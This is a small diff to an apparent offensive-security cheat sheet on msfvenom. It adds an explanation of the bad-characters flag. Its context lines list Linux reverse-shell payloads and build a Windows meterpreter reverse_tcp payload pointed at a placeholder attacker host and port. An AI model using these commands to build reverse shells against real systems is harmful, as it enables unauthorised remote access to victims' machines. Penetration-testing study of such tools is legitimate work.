@@ -14,7 +14,17 @@ You can generate a webshell by using  msfvenom
 # List payloads
 msfvenom --list payloads | grep x64 | grep linux | grep reverse  
 ```
-  
+
+
+
+## Some flags
+
+```bash
+# -b, or --bad-chars: The list of characters to avoid example: '0'
+
+```
+
+
 ## Staged payload
 
 ```bash
@@ -42,4 +52,5 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x
 # -a: architecture in the victim machine/application
 # -f: format for the output file
 ```
+
 
